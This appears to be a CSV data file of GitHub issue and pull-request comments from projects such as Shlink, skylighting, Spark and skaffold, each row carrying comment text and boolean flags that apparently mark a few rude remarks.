shinemoon.github.io/shinemoon/1/81972739,"Hello I'm using your template in my blog ( and I would like it to be mobile-friendly  that possible? Thanks, awesome work you are doing here ",False,True,False,shinemoon.github.io/shinemoon/1
shinymaterial/ericrayanderson/46/327083591,I want to disable title bar from material page where it is default.is there a way I can do that. ,False,True,False,shinymaterial/ericrayanderson/46
shinymaterial/ericrayanderson/46/392623758,"Try the most recent dev version, it allows for not including the nav bardevtoolsinstall_github(""ericrayanderson/shinymaterial"")` ",False,True,False,shinymaterial/ericrayanderson/46
shlink/shlinkio/210/361226392,"Trying a fresh install, getting this error. Afterall I think the installment is (based on the previous issues) way to user unfriendly. Maybe should think about an installer that also checks the needed additions, as said in #152  // or make the install readme more detailed. By saying ""Setup the application by running the  script."" it first confused me, too, and took me half an hour until I figured out this is not really an installer but more of an commandline enhancer to install/compile the script. Anyway, back to my problem It was throwing out the error befor and after I installed the required APCu. So I have no idea what is stopping the installation. Sys  CPU | Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz (6 core(s)) Version | Plesk Onyx v17.8.11_build1708180301.19 os_Ubuntu 16.04 OS | Ubuntu 16.04.5 LTS PHP 7.2.10  ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422334444,"I'm afraid that error means you are not really using PHP 7.2, but 7.0 or older. That's why it does not get ""void"" as a reserved word, and instead it tries to load it as a class. Many people has faced this problem before. Make sure you run the installer with the proper PHP version ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422335696,"I freshly set up a host with a fresh 7.2 php install. My server has 7.0.30 as lowest php installation and the package I am using for shlink is using 7.2.10 FPM, should I maybe use 7.2.10 FastCGI? ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422337601,"It might be that you are using the proper version from the web context (the fpm), but not from the command line. You can check by running php -v ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422337852,,False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422338179,There you have the problem. It's PHP 7.0 ,False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422339248,"I'm on it. If I get it running, let me check if I can get it to work now. ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422346159,"Okay, this form of installation is honestly the worst I have ever experienced. I love the product, really the best link shortner I've ever used but the installation, you really have to fix that, it took me 2 hours in general to even make the installation starting with all preperation without the knowledge of a certified sysadmin. I am very sure that the extreme lack of user experience of your installation process is the man key factor your awesome programm isn't far spread. Now that I got your installation running, it only needed my one single type to f* over the whole installation and letting me redo the whole process after removing it all again. Short I got it working, but please rework your installation process, it is horrible. Great product anyway. Thank you so much. ",True,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422348839,"nevermind last click on install ♠PHP Fatal error  Uncaught Error Undefined class constant 'MYSQL_ATTR_INIT_COMMAND' in /var/www/vhosts/xxx.xxx/httpdocs/module/CLI/src/Model/CustomizableAppConfig.php263 Stack trace 0 /var/www/vhosts/xxx.xxx/httpdocs/module/CLI/src/Command/Install/InstallCommand.php(142) Shlinkio\Shlink\CLI\Model\CustomizableAppConfig-&gt;getArrayCopy() 1 /var/www/vhosts/xxx.xxx/httpdocs/vendor/symfony/console/Command/Command.php(251) Shlinkio\Shlink\CLI\Command\Install\InstallCommand-&gt;execute(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 2 /var/www/vhosts/xxx.xxx/httpdocs/vendor/symfony/console/Application.php(886) Symfony\Component\Console\Command\Command-&gt;run(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 3 /var/www/vhosts/xxx.xxx/httpdocs/vendor/symfony/console/Application.php(262) Symfony\Component\Console\Application-&gt;doRunCommand(Object(Shlinkio\Shlink\CLI\Command\Install\InstallCommand), Object(Symfony\C in /var/www/vhosts/xxx.xxx/httpdocs/module/CLI/src/Model/CustomizableAppConfig.php on line 263` ",False,True,False,shlink/shlinkio/210
shlink/shlinkio/210/422498472,"Well, to be honest, I don't have to do anything. You have probably noticed this software is completely free of charge, which not only includes the software itself, but also some support from my side, and the will to implement missing features and help as much as I can. However I work on this on my free time (mostly weekends, vacation periods and a few hours from Monday to Friday), which means there's always going to be missing things and parts that can be improved. It's easy to spot what's not working, what made you waste two hours of your time. What's not that easy is being able to see what's actually working (I have ""wasted"" hundreds of hours on this, but you are welcome). In the future you should learn some manners when dealing with free and open source software maintainers, and remember that they don't work for you. Any constructive feedback is always welcome but not like this. ",False,True,False,shlink/shlinkio/210
sickrage-issues/SiCKRAGETV/205/52465321,is it possible to get the address used to access SB instead of IP - in the case of address(url) &lt;&gt; local IP ,False,True,False,sickrage-issues/SiCKRAGETV/205
sickrage-issues/SiCKRAGETV/205/67712308,"there's already a code for it but the ""helpers.get_lan_ip()"" is not getting the public IP anymore. it returns the local ip now. Used to work. ",False,True,False,sickrage-issues/SiCKRAGETV/205
sickrage-issues/SiCKRAGETV/205/67727537,i'm on a roll here guys ... FIXED! ,False,True,False,sickrage-issues/SiCKRAGETV/205
simple-carousel/scottalexandra/1/205787975, Adds main.scss Adds font awesome  ,False,True,False,simple-carousel/scottalexandra/1
skaffold/GoogleCloudPlatform/190/304109991,Let's see if it works... Signed-off-by David Gageot david@friend.net ,False,True,False,skaffold/GoogleCloudPlatform/190
skaffold/GoogleCloudPlatform/190/372072035,"This is an error related to symlinks.  The temp dir in osx is actually symlinked and that messes up some of the filesystem watching.  Ideally we shouldn't get to this point since we filter out all the symlinks before it gets to ""watch"", but we should still fix it. ",False,True,False,skaffold/GoogleCloudPlatform/190
skaffold/GoogleCloudPlatform/190/373983067,@friend I fixed the symlink issue in  This seems to work great now. ,False,True,False,skaffold/GoogleCloudPlatform/190
skylighting/jgm/55/431508326,"A mystery.  I can't reproduce this locally or in CI. And as far as I can see, the 'got' and 'expected' values here are  identical (as Styles, not as strings of course, because of nondeterministic Show). ",False,True,False,skylighting/jgm/55
spark/perwendel/1020/328394688,"I hava a 512m vps, I want to build some website on it. memory is too small, I must select a simple and high performance java web framework. I just read the spark's doc, I found some code like this Do you know what's the feeling of me?  foolish, child-liking ,  naive I want a normal code style like this You all contributors should focus on simple and performance and low memory-use, not the  naive grammar features! ",False,True,False,spark/perwendel/1020
spark/perwendel/1020/393774441,"There is an instance api, showed in this new post  looks more or less the same as the static api. ",False,True,False,spark/perwendel/1020
skylighting/jgm/55/371859944,"Citing from   FromJSON instance tests     decode simple color                                 OK     decode TokenStyle                                   OK     decode KDE theme to Style                           FAIL       test/test-skylighting.hs70       expected Just (Style {tokenStyles = fromList [(KeywordTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(DataTypeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DecValTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BaseNTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FloatTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ConstantTok,TokenStyle {tokenColor = Just (RGB 170 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CharTok,TokenStyle {tokenColor = Just (RGB 146 76 157), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialCharTok,TokenStyle {tokenColor = Just (RGB 61 174 233), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(StringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VerbatimStringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialStringTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ImportTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentTok,TokenStyle {tokenColor = Just (RGB 137 136 135), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DocumentationTok,TokenStyle {tokenColor = Just (RGB 96 120 128), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AnnotationTok,TokenStyle {tokenColor = Just (RGB 202 96 202), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentVarTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(OtherTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FunctionTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VariableTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ControlFlowTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(OperatorTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BuiltInTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ExtensionTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(PreprocessorTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AttributeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(RegionMarkerTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Just (RGB 224 233 248), tokenBold = False, tokenItalic = False, tokenUnderline = False}),(InformationTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(WarningTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AlertTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Just (RGB 247 230 230), tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ErrorTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = True}),(NormalTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False})], defaultColor = Just (RGB 31 28 27), backgroundColor = Just (RGB 255 255 255), lineNumberColor = Just (RGB 160 160 160), lineNumberBackgroundColor = Just (RGB 255 255 255)})        but got Just (Style {tokenStyles = fromList [(KeywordTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(DataTypeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DecValTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BaseNTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FloatTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ConstantTok,TokenStyle {tokenColor = Just (RGB 170 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CharTok,TokenStyle {tokenColor = Just (RGB 146 76 157), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialCharTok,TokenStyle {tokenColor = Just (RGB 61 174 233), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(StringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VerbatimStringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialStringTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ImportTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentTok,TokenStyle {tokenColor = Just (RGB 137 136 135), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DocumentationTok,TokenStyle {tokenColor = Just (RGB 96 120 128), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentVarTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(OtherTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FunctionTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VariableTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ControlFlowTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(OperatorTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BuiltInTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ExtensionTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(PreprocessorTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AttributeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(RegionMarkerTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Just (RGB 224 233 248), tokenBold = False, tokenItalic = False, tokenUnderline = False}),(InformationTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(WarningTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AlertTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Just (RGB 247 230 230), tokenBold = True, tokenItalic = False, tokenUnderline = False}),(AnnotationTok,TokenStyle {tokenColor = Just (RGB 202 96 202), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ErrorTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = True}),(NormalTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False})], defaultColor = Just (RGB 31 28 27), backgroundColor = Just (RGB 255 255 255), lineNumberColor = Just (RGB 160 160 160), lineNumberBackgroundColor = Just (RGB 255 255 255)})     round trip style -&gt; theme -&gt; style                  FAIL       test/test-skylighting.hs72       expected Just (Style {tokenStyles = fromList [(KeywordTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(DataTypeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DecValTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BaseNTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FloatTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ConstantTok,TokenStyle {tokenColor = Just (RGB 170 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CharTok,TokenStyle {tokenColor = Just (RGB 146 76 157), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialCharTok,TokenStyle {tokenColor = Just (RGB 61 174 233), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(StringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VerbatimStringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialStringTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ImportTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentTok,TokenStyle {tokenColor = Just (RGB 137 136 135), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DocumentationTok,TokenStyle {tokenColor = Just (RGB 96 120 128), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AnnotationTok,TokenStyle {tokenColor = Just (RGB 202 96 202), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentVarTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(OtherTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FunctionTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VariableTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ControlFlowTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(OperatorTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BuiltInTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ExtensionTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(PreprocessorTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AttributeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(RegionMarkerTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Just (RGB 224 233 248), tokenBold = False, tokenItalic = False, tokenUnderline = False}),(InformationTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(WarningTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AlertTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Just (RGB 247 230 230), tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ErrorTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = True}),(NormalTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False})], defaultColor = Just (RGB 31 28 27), backgroundColor = Just (RGB 255 255 255), lineNumberColor = Just (RGB 160 160 160), lineNumberBackgroundColor = Just (RGB 255 255 255)})        but got Just (Style {tokenStyles = fromList [(KeywordTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(DataTypeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DecValTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BaseNTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FloatTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ConstantTok,TokenStyle {tokenColor = Just (RGB 170 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CharTok,TokenStyle {tokenColor = Just (RGB 146 76 157), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialCharTok,TokenStyle {tokenColor = Just (RGB 61 174 233), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(StringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VerbatimStringTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(SpecialStringTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ImportTok,TokenStyle {tokenColor = Just (RGB 255 85 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentTok,TokenStyle {tokenColor = Just (RGB 137 136 135), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(DocumentationTok,TokenStyle {tokenColor = Just (RGB 96 120 128), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(CommentVarTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(OtherTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(FunctionTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(VariableTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ControlFlowTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(OperatorTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(BuiltInTok,TokenStyle {tokenColor = Just (RGB 100 74 155), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(ExtensionTok,TokenStyle {tokenColor = Just (RGB 0 149 255), tokenBackground = Nothing, tokenBold = True, tokenItalic = False, tokenUnderline = False}),(PreprocessorTok,TokenStyle {tokenColor = Just (RGB 0 110 40), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AttributeTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(RegionMarkerTok,TokenStyle {tokenColor = Just (RGB 0 87 174), tokenBackground = Just (RGB 224 233 248), tokenBold = False, tokenItalic = False, tokenUnderline = False}),(InformationTok,TokenStyle {tokenColor = Just (RGB 176 128 0), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(WarningTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(AlertTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Just (RGB 247 230 230), tokenBold = True, tokenItalic = False, tokenUnderline = False}),(AnnotationTok,TokenStyle {tokenColor = Just (RGB 202 96 202), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False}),(ErrorTok,TokenStyle {tokenColor = Just (RGB 191 3 3), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = True}),(NormalTok,TokenStyle {tokenColor = Just (RGB 31 28 27), tokenBackground = Nothing, tokenBold = False, tokenItalic = False, tokenUnderline = False})], defaultColor = Just (RGB 31 28 27), backgroundColor = Just (RGB 255 255 255), lineNumberColor = Just (RGB 160 160 160), lineNumberBackgroundColor = Just (RGB 255 255 255)})  ",False,True,False,skylighting/jgm/55
spark/perwendel/1020/393777939,"Service http = ignite();  even more foolish! I think you all java programmer should learn some programming theory from UNIX/Linux. Java is a enterprise programming platform, commercial companies like oracle/sun/ibm want to earn more money from customers, so they make java complex and heavy! UNIX/Linux programming theory is the only correct way. ",True,True,False,spark/perwendel/1020
spr-issue-migration-test-2/rstoyanchev/13236/393007229,"Sébastien Deleuze opened SPR-13192 and commented In addition to current global and fine grained CORS Spring MVC capabilities, we should provide an optional CORS filter that could be executed before the . This filter should use the existing  and a  implementation that could be configured with a .  Referenced from commits  ",False,True,False,spr-issue-migration-test-2/rstoyanchev/13236
spring-security-migrate-issues/rwinch/1169/128574987,Taylor Mathewson (Migrated from SEC-1151) said On line 130 of AclImpl.java in trunk (line number is different in other releases) a check is performed on the upper bound of the list of access control entries. Code is         if (aceIndex &gt; this.aces.size()) { should be         if (aceIndex &gt;= this.aces.size()) { Result is that exception out of underlying list impl is thrown.  Minor. ,False,True,False,spring-security-migrate-issues/rwinch/1169
stls-mobile-app/smart-traffic-light-system/12/345972382,"Bumps @friend/platform-browser-dynamic from 5.1.0 to 6.1.0. &lt;details&gt; &lt;summary&gt;Changelog&lt;/summary&gt;  *Sourced from [@friend/platform-browser-dynamic's changelog]( []( release cut the v6.1.0 release - []( Revert ""feat(core) add support for using async/await with Jasmine"" ([#25096]( []( fix(router) Fix _lastPathIndex in deeply nested empty paths ([#22394]( []( fix(ivy) update compiler with latest runtime for view queries ([#25061]( []( docs(animations) typo fix in the comments ([#22652]( []( docs refactor style guide example 03-06 ([#24996]( []( Revert ""docs refactor style guide example 03-06 ([#24996]( []( docs refactor ngmodules example ([#25072]( []( docs replace angular/http with HttpClient ([#25068]( []( docs replace angular/http with HttpClient ([#25066]( Additional commits viewable in [compare view]( /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  ---  **Note** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.  You can always request more updates by clicking  in your [Dependabot dashboard]( commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will merge this PR after your CI passes on it -  will reopen this PR if it is closed -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True,False,stls-mobile-app/smart-traffic-light-system/12
svg-material-icons/rcotrina94/1/144203870,There are new icons added to the Material icon library. Ive used your sprites up until now cause it works perfectly with Angular material. But need the new icons that are added. Are there any plan for adding the new icons to your sprites? Would really appreciate it! ,False,True,False,svg-material-icons/rcotrina94/1
svg-material-icons/rcotrina94/1/276444201,"@friend  Hi, thanks for letting me know this, and sorry for the super delayed response. I'll get some time to update the icons. Thanks! ",False,True,False,svg-material-icons/rcotrina94/1
system_tests/ros2/56/148218008,Does this test have to replicate the whole testing with spin etc. or is it sufficient to only check the signature to create a subscription with a queue size? ,False,True,False,system_tests/ros2/56
system_tests/ros2/56/148218533,"Well, I figure it was worth making sure a subscription created with this API would result in a functioning subscription, but I can slim the test down further if you don't think that's important. ",False,True,False,system_tests/ros2/56
